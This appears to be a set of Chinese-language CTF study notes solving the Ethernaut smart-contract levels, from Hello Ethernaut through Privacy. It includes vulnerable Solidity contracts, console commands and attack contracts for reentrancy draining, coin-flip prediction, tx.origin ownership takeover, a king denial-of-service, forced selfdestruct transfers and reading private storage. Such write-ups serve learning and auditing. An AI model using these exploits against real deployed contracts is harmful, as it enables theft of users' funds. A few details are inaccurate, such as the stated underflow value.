# Ethernaut靶场笔记

### hello ethernaut

- 新手关卡：属于教程关卡，完成关卡前需要先连接钱包，选择测试网络
- 首先我们需要在下方点击生成新的合约实例，然后F12打开控制台面板，按照提示一步一步往下输入命令即可。
- 按照提示要求输入`await contract.info()`,得到结果`'You will find what you need in info1().'`
    
    输入`await contract.info1()`,得到结果`'Try info2(), but with "hello" as a parameter.'`
    
    输入`await contract.info2('hello')`,得到结果`'The property infoNum holds the number of the next info method to call.`
    
    输入`await contract.infoNum()`,得到infoNum参数值为`42`
    (words中的首位)。这就是下一步要调用的函数(`info42`)。
    
    输入`await contract.info42()`,得到结果`'theMethodName is the name of the next method.`，即下一步应当调用`theMethodName`
    
    输入`await contract.theMethodName()`,得到结果`'The method name is method7123949.`
    
    输入`await contract.method7123949()`,得到结果`'If you know the password, submit it to authenticate().`
    
    输入`await contract.password()` 获取密码为`ethernaut0`
    
    输入`await contract.authenticate('ethernaut0'),`将其提交到`authenticate(string)`
    
    当输入了authenticate()函数后，metamask会弹出交易确认信息，此时本关卡完成，选择Sumbit Instance提交即可，然后控制台页面会弹出成功提示。
    
- ps：
    - 调用了`authenticate()`函数后，Metamask会弹出交易确认，这是因为该函数改变了合约内部的状态（以实现对关卡成功的检查工作），而其他先前调用的函数却没有（为View）。
    - 在console界面可以通过`player`和`contract`分别查看用户当前账户和被创建合约实例。`player`代表用户钱包账户地址，而`contract`则包含合约实例`abi`、`address`、以及方法信息。
    - 在生成新的实例合约后，可以看到主合约的交易详情，进入交易详情，查看内部交易，发现合约之间产生了调用。第一笔是由主合约调用关卡合约，第二笔是由关卡合约创建合约实例
    - 本关卡目的是为了让我们熟悉ethernaut的命令操作和原理

### fallback

- 按照之前的步骤生成新的合约实例，首先生成实例，在游览器控制台得到合约地址为：0x3eAc929a9Fd14831E218F2Da0ED3187c66BD706e
- 本关卡要求：获得合约的所有权并清空合约的余额
- 合约代码：
    
    ```solidity
    * pragma solidity ^0.8.0;
    
      contract Fallback {
    
        mapping(address => uint) public contributions;
        address public owner;
    
        constructor() {
          owner = msg.sender;
          contributions[msg.sender] = 1000 * (1 ether);
        }
    
        modifier onlyOwner {
              require(
                  msg.sender == owner,
                  "caller is not the owner"
              );
              _;
          }
    
        function contribute() public payable {
          require(msg.value < 0.001 ether);
          contributions[msg.sender] += msg.value;
          if(contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
          }
        }
    
        function getContribution() public view returns (uint) {
          return contributions[msg.sender];
        }
    
        function withdraw() public onlyOwner {
          payable(owner).transfer(address(this).balance);
        }
    
        receive() external payable {
          require(msg.value > 0 && contributions[msg.sender] > 0);
          owner = msg.sender;
        }
    
      }
    
    *
    ```
    
- 解体步骤：
    - 该题中合约所有权变更的方法为contribute()和receive()。在contribute()方法中，由逻辑可知只要用户随调用发送小于0.001eth，用户的贡献额大于owner，就可以获得所有权，但构造函数里面owner的创建额为1000eth，所以通过大于owner的贡献的方法不现实了。而在receive()函数中，我么可以知道只要用户发送的wei大于>0且之前用户已发送过任意eth，即调用过一次contribute()函数，就可以获得所有权，在获取所有权后调用withdraw函数就能完成第二个条件清空余额
    - 首先在命令行使用contract命令查看合约abi和对外函数情况
    - 输入`await contract.contribute({value:1})`，向合约发送1单位Wei，此时就满足了之前发送过eth这一条件
    - PS：此时可以通过输入`await contract.getContribution()`
    查看用户贡献，发现贡献度为1，满足调用`receiver()`
    默认函数的最低要求
    - 输入`await contract.sendTransaction({value:1})`构造转账交易发送给合约
    - 输入`awit contract.owner()`查看得知合约所有权已变更
    - 输入`awir contract.withdraw()`将合约余额转进自己余额
    - 提交实例，该关卡完成
- 在remix中的解体步骤：
    - 在remix中部署智能合约，在合约地址中填上上面生成的实例地址
    - 以太币数量填1wei，然后contribute，在metamask中确认后即满足contribute方法中msg.value<0.001eth的条件
    - 在contribute中if条件当你的余额大于部署者余额时，你就成为owner。
    - 在remix上执行Transact，消息调用成功后receive方法将msg.sender作为owner，此时remix上的owner地址为你的地址，完成了第一个成为部署者的任务
    - 执行withdraw方法，将合约中的钱全部转移到当前账户中，完成第二个资产转移任务
- PS：
    - recive和fallback的区别：
    - 简单来说，合约接收`ETH`时，`msg.data`为空且存在`receive()`时，会触发`receive()`；`msg.data`不为空或不存在`receive()`时，会触发`fallback()`，此时`fallback()`必须为`payable`。
    - `receive()`和`payable fallback()`均不存在的时候，向合约**直接**发送`ETH`将会报错（你仍可以通过带有`payable`的函数向合约发送`ETH`）。
    - 当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发；

### fallout

- 要求：获取合约所有权
- 合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    
    import 'openzeppelin-contracts-06/math/SafeMath.sol';
    
    contract Fallout {
    
      using SafeMath for uint256;
      mapping (address => uint) allocations;
      address payable public owner;
    
      /* constructor */
      function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
      }
    
      modifier onlyOwner {
              require(
                  msg.sender == owner,
                  "caller is not the owner"
              );
              _;
          }
    
      function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
      }
    
      function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
      }
    
      function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
      }
    
      function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
      }
    }
    ```
    
- 解题步骤：
    - 在合约中找能改变合约拥有者的函数，只能找到fal1out()函数，很明显在本关卡中合约创建者创建该函数出错，将fallout()写成了fal1out()，所以直接调用该函数即可获得所有权。
    - 输入`await contract.Fal1out({value:1})`实现所有权的获取。
    - 输入`await contract.owner()`或者`await contract.owner() === player`即可确认已获取到了合约所有权。提交实例关卡完成
- PS：
    - 对于Solidity来说，其在0.4.22前的编译器版本支持同合约名的构造函数，而在0.4.22起只支持利用`constructor()`构建，就是为了避免开发者将同名函数名写错。

### coin Flip

- 要求：连续10次猜对硬币的正反面
- 合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract CoinFlip {
    
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
      constructor() {
        consecutiveWins = 0;
      }
    
      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
    
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
    ```
    
- 解题步骤：
    - 由flip()函数可知硬币的正反面是由当前区块的前一个区块的高度决定的，并且函数通过lashHash保证了同一区块只能提交一次，由第一关卡可知合约之间可以相互调用，并且本次调用和初始调用存在于同一区块。我们可以通过创建攻击合约先手预测硬币正反面，再调用目标合约。
    - 先把本关卡合约源码复制在remix上并编译和部署，再在remix上部署攻击合约，将目标合约的地址传入构造函数的参数。部署完成后，执行attack()方法就完成了一次攻击
    - 输入`await contrat.consecutiveWins()`可以查看合约的成功次数，依次调用10次后，攻击完成，提交本关卡
- 攻击合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    import "./CoinFlip.sol";
    
    contract Attack{
        CoinFlip private coinFlip;
        uint256 FACOTR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
        constructor(address _name){
            coinFlip = CoinFlip(_name);
        }
        function attack() external{
            bool guess = guess();
            require(coinFlip.flip(guess),"guess false");
    
        }
    
        function guess() private view returns(bool){
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue/FACOTR;
            bool side =  coinFlip == 1? true : false;
            return side;
        }
    
    }
    ```
    
- PS：
    - 在合约调用的时候，要注意gas limit的设置，超了会在remix上爆出out of gas或者reverted的错误，可以在metamaks交易确认界面设置，需要在metamask上确认10次attack都成功才行。

### telephone

- 要求：成为获取合约所有权
- 合约代码
    
    ```
    pragma solidity ^0.6.0;
    
    contract Telephone {
    
      address public owner;
    
      constructor() public {
        owner = msg.sender;
      }
    
      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
    
    ```
    
- 题解步骤：
    - 改变合约所有权的只有changeOwner()函数，我们可以在攻击合约中调用该函数，此时tx.origin是我们自己的地址，而msg.sender是我们部署的攻击合约的地址，就能完成通过if获取到合约的所有权。
    - 先将攻击合约在remix上编译，部署时传入生成关卡合约的地址，调用attack()函数攻击。
    - 输入`await contract.owner()`，确认合约所有权为我们自己，提交实例关卡完成。
- 攻击合约：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Attack{
        Telephone telephone;
    
        function changeOwner(address _address) public{
            telephone=Telephone(_address);
        }
    
        function attack() public{
            telephone.changeOwner(msg.sender);
        } 
    
    }
    ```
    
- PS：
    - tx.origin()：交易发起者（完全的调用链）
    - msg.sender()：消息发送者（当前调用）
    - 两者区别：msg.sender是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约地址。tx.orgin是这个交易的原始发起方，无论中间有多少次合约内外函数调用，而一定是账户地址而不是合约地址
    - eg：用户通过合约A调用合约B
        - 合约A：tx.origin和msg.sender都是用户
        - 合约B：tx.origin是用户，msg.sender是合约A

### Token

- 题目要求：增加手中的token数量
- 合约代码：
    
    ```
    pragma solidity ^0.6.0;
    
    contract Token {
    
      mapping(address => uint) balances;
      uint public totalSupply;
    
      constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
      }
    
      function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
      }
    
      function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
      }
    }
    
    ```
    
- 解体步骤：
    - 观察合约可知要增加我们手中的token数量从transfer()函数入手，在该函数中要求`require(balances[msg.sender] - _value >= 0);` 在这里，因为`balances[msg.sender]`
    和`value`都是uint，因此两个相减的结果一定仍然是uint(可能会存在下溢出)，而uint类型变量一定大于等于0，所以这里结果一定大于等于0。然后`balances[_to] += _value;`
    ，使得余额变多。
    - 故我们在控制台上直接输入`await contract.transfer("0xE82fEdF89EC54c2FF3CE976cE5851d91E4f7a2c2",21)` ，因为原始值为20，20-21<0后直接发生下溢出导致余额变成2的255次方
    - 输入`await contract.balanceOf(player)`查看余额确认余额变多，提交实例关卡完成。
- PS：solidity溢出
    - 在solidity中，uint类型会存在溢出，例如unit8的最大值就是255，最小值为0；
    - 上溢：如果在某个uint8变量的值在255时再次对他进行+1的操作，就会导致上溢，值变为0；
    - 下溢：在某个uint8变量值为0时，对他进行减法操作，就会导致下溢，值变为2的255次方.

### Delegation

- 题目要求：获取合约Delegation所有权
- 合约代码：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Delegate {
    
      address public owner;
    
      constructor(address _owner) {
        owner = _owner;
      }
    
      function pwn() public {
        owner = msg.sender;
      }
    }
    
    contract Delegation {
    
      address public owner;
      Delegate delegate;
    
      constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
      }
    
      fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
          this;
        }
      }
    }
    ```
    
- 解体步骤：
    - 要求获取Delegaion合约的所有权，但是观察Delegation合约里面并没有更改所有权的函数或操作，而Delegate合约里pwn()函数可以更改合约的所有权。
    - 在Delegation合约里面使用了delegatecall()操作，因此执行环境会变成调用者的环境，这个调用者即是`Delegation`合约，而这里的msg.data为pwn()时可以调用到实例delegate中的pwn(),导致owner变成了调用这个fallback函数的人。因此虽然调用的是`Delegate`合约里的pwn函数，但是修改的并不是`Delegate`合约里的owner，而是`Delegation`里的owner。
    - 在控制台输入 `await contract.sendTransaction({data:web3.utils.keccak256(“pwn()”).slice(0,10)})`
    - PS：这里的data是为了调用pwn函数，用keccak256进行编码且只取了前四个字节。而 function id 为4 bytes的hash值,加上前面的0x，总共是要取前10个字符。所以使用`keccak256(“pwn()”).slice(0,10)`。pwn()的function id是 0xdd365b8b ,将其放入msg.data中，打钱给合约地址。
    - 输入await contract.owner()确认合约所有权是我们后提交实例关卡完成
- PS：delegatecall
    - call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)
    - delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。
    - callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。

### Force

- 题目要求：使合约的余额大于0
- 源码：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Force {/*
    
                       MEOW ?
             /\_/\   /
        ____/ o o \
      /~____  =ø= /
     (______)__m_m)
    
    */}
    ```
    
- 解体步骤：
    - 给了一个空的合约要求转账，但转账涉及的函数：transfer()、send()、call()三个函数的前提都是需要目标合约中存在payable修饰的函数，但该合约没有
    - 合约自毁时可以将合约剩下的所有以太发送给指定地址，而不用管目标地址是否接受转账。
    - 在remix中编译并部署攻击合约Attack，将生成的目标合约地址作为attack()函数的参数传入，在attack的时候记得要给合约转1 wei。提交实例后该关卡完成
- 攻击合约：
    
    ```solidity
    pragma solidity ^0.6.0;
    
    contract Attack {
        function attack(address _address) payable public {
            selfdestruct(payable(_address));
        }
    }
    ```
    
- PS：selfdestruct自毁函数：
    - 执行后，合约将拒绝服务，地址对应的字节码标注为删除
    - 合约地址中所有的eth将被发送到指定的新地址
    - 进行eth转移时，即使目标地址为一个合约的地址，也不会触发该合约的fallback()函数，因此不需要该合约有任何的payable修饰的函数

### Vault

- 题目要求：解锁
- 合约代码：
    
    ```
    pragma solidity ^0.6.0;
    
    contract Vault {
      bool public locked;
      bytes32 private password;
    
      constructor(bytes32 _password) public {
        locked = true;
        password = _password;
      }
    
      function unlock(bytes32 _password) public {
        if (password == _password) {
          locked = false;
        }
      }
    }
    ```
    
- 解体步骤：
    - 本关卡要求我们解锁，就是让locked变量的状态变为false，所以需要用到unlock()函数。观察该函数得知只要我们知道正确的密码password就能解锁，但是password是该合约的私有变量看不到，但这个私有仅限于合约层面的私有，合约外依然可以读取
    - 在该合约中，password是storage类型的变量存储在链上，而在区块链中，存储在链上的肯定是能查看到的
    - 合约使用外界未知的私有变量。虽然变量是私有的，无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值
    - `web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])`，使用这个命令可以看到储存在某个地址的存储内容。
    - 接下来我们要分析password存储的位置信息，这里引入插槽这个概念，见PS中。
    - 该合约中locked为bool类型占一个字节，password为bytes32占用32个字节。故locked占用slot(0)，因为剩下空间容纳不下bytes32，所以password移向slot(1)中存储
    - 输入`await web3.eth.getStorageAt(contract.address,1)`
    获取`byte32 password`
    - 输入`await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')`实现对合约的解锁。
    - 输入`await contract.locked()`可以发现合约已经解锁，提交实例该关卡完成
- PS：插槽
    - 以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽（slot），其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。每个数据存储的插槽位置是一定的。
    - 每个插槽32字节，对于值类型，其存放是连续的，满足以下规律。
        - 存储插槽的第一项会以低位对齐（即右对齐）的方式储存
        - 基本类型仅使用存储它们所需的字节
        - 如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽
        - 结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）

### king

- 题目要求：要求我们成为king并阻止其他人成为king
- 合约源码：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract King {
    
      address king;
      uint public prize;
      address public owner;
    
      constructor() payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
      }
    
      receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
      }
    
      function _king() public view returns (address) {
        return king;
      }
    }
    ```
    
- 解体步骤：
    - 观察receive()函数，可知当发送金额大于当前奖金prize，即用户将发送金额发送给合约，合约向金额发送给当前king后，当前king更新且奖金更新，发送者就能成为新的king，当我们成为king之后，只要拒绝接受合约发送的金额整个过程回退，其他人就无法成为king
    - 在攻击合约中，我们向生成的目标合约地址发送eth大于price后，我们就是新的king了，而其它人向我们转账时，因为此时地址_addr为我们的攻击合约，一转账就会触发fallback()函数回退操作，从此阻止了其他人成为king
    - 在目标合约详情页面可以看到创建合约时传入了0.001eth，故我们创建攻击合约后，部署攻击合约时传入大于0.001的eth，然后调用attack方法即可
    - 输入`await contract._king()`,可以查看到国王地址变为了我们的攻击合约，提交实例该关卡完成
- 攻击合约：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Attack {
    
        constructor() public payable{
    
        }
    
        function attack(address payable _addr) public payable{
    
            _addr.call.value(msg.value)("");
    
        }
    
        fallback() payable external{
            revert();
        }
    
    }
    ```
    
- PS：transfer
    - transfer:要求接收的智能合约中必须有一个`fallback`或者`receive`函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误：
        - 付款方合约的余额不足，小于所要发送的value
        - 接收方合约拒绝接收支付
    - send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。
    - call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上将参数设置为空会触发接纳合约的`fallback`函数，运用call同样也能够调用本合约内的函数。
    

### ****Re-entrancy****

- 题目要求：拿走合约中的所有钱
- 合约源码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

- 解题步骤：
    - 该合约有一个withdraw()转账即取钱函数，观察该函数我们可知，该函数弄错了记账、转账的顺序（先转账，再记账）
    - 在目标合约中使用的是 `msg.sender.call{value:_amount}("")`
    ，并且在这之后才减少 balances，而这里使用的是call()转账函数，所以会触发fallback()函数，我们在攻击合约中再次调用withdraw()函数就实现了重入攻击，不断取出目标合约中的余额直到为0
    - 先输入`await getBalance(instance)`,可以知道目标合约的余额为0.001eth，所以每次 withdraw 0.001 eth。
    - 我们部署攻击合约，先调用donate()函数向目标合约转入0.001eth，就满足了if中的判断条件，然后调用withdraw()函数取走我们刚存入的钱，然后会触发攻击合约中fallback()函数继续调用目标合约中的withdraw()函数，而balances还没有改变所以if判断成立，就能继续取走合约中的钱直到合约中的钱取空。
- 攻击合约：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    
    contract Attack {
        Reentrance Reentrance;
        uint money;
        
        constructor(address payable _addr) public payable {
            Reentrance = Reentrance(_addr);
        }
    
        function donate()public payable{
            money=msg.value;
            Reentrance.donate{value:money}(address(this));
        }
    
        function withdraw() public {
            Reentrance.withdraw(money);
        }
    
        fallback() external payable {
            if (address(Reentrance).balance >= 0) {
                Reentrance.withdraw(money);
            }
        }
        
    }
    ```
    
- PS：
    - 经典的重入攻击

### Elevator

- 题目要求：电梯达到顶部
- 合约源码：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface Building {
      function isLastFloor(uint) external returns (bool);
    }
    
    contract Elevator {
      bool public top;
      uint public floor;
    
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
    
        if (! building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }
    ```
    
- 解体步骤：
    - 观察该合约我们可知，要想达到顶层即使top变量变为true，而top的变化只会在goTo函数里发生变化，当isLastFloor为false时top变量才会更改，而且两次调用isLastFloor的参数一样，所以我们需要在第一次调用isLastFloor的时候返回false，第二次调用的时候返回true
    - 由于在目标合约的goTo函数中，构建Building接口的参数时msg.sender，所以我们需要提供一个满足Building接口的isLastFloor的查询函数。在我们的攻击合约中，每次调用isLastFloor函数top的值都会翻转一次从而使goTo函数里面的条件成立
    - 首先我们部署攻击合约并传入目标合约的地址，然后输入`await contract.top()`可以得知顶层top的值为false，然后调用attack函数，再输入`await contract.top()` 就可以得知顶层为true。提交实例该关卡完成
- 攻击合约：
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Attack {
        Elevator elevator;
    
        bool top = true;
    
        constructor(address _addr) public {
            elevator = Elevator(_addr);
        }
    
        function isLastFloor(uint) public returns (bool) {
            top = !top;  
            return top;
        }
    
        function attack() public {
            elevator.goTo(1);
        }
    
    }
    ```
    

### ****Privacy****

- 题目要求：调用unlock
- 合约源码：
    
    ```solidity
    / SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Privacy {
    
      bool public locked = true;
      uint256 public ID = block.timestamp;
      uint8 private flattening = 10;
      uint8 private denomination = 255;
      uint16 private awkwardness = uint16(block.timestamp);
      bytes32[3] private data;
    
      constructor(bytes32[3] memory _data) {
        data = _data;
      }
      
      function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
      }
    
      /*
        A bunch of super advanced solidity algorithms...
    
          ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
          .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
          *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
          `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
          ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
      */
    }
    ```
    
- 解体步骤：
    - 调用unlock函数的条件很简单，要求输入的参数key和data[2]相同，不难看出和之前vault那道题类似，都是通过web3.eth.getStorageAt获得
    - 该题的插槽存储结构为：
        
        ```solidity
        unused(31) locked(1) ⇐ slot(0)
        ID(32) ⇐ slot(1)
        unused(28) flattening(1) denomination(1) awkwardness(2) ⇐ slot(2)
        data[0](3 2) ⇐ slot(3)
        data[1](3 2) ⇐ slot(4)
        data[2](3 2) ⇐ slot(5)
        ```
        
    - 可以得知data[2]存储再slot(5)中
    - 所以我们直接在控制台输入 await `web3.eth.getStorageAt(contract.address,5)`得到data[2]的值`data2='0xad4d68dd2ede6bf23b06d5ed3076ab0d4aae1aac23a1ebaea656ec35650d4ac3’`，此时bytes16与bytes32之间存在转换。要注意，以太坊有两种存储方式，大端（strings & bytes，从左开始）及小端（其他类型，从大开始）。因此，从32到16转换时，需要砍掉右边的16个字节。
    - 输入`data[2].slice(0,34)` 之后得到新的值`0xad4d68dd2ede6bf23b06d5ed3076ab0d`
    - 输入 `contract.unlock(”0xad4d68dd2ede6bf23b06d5ed3076ab0d”)` 合约就完成了解锁，提交实例该关卡完成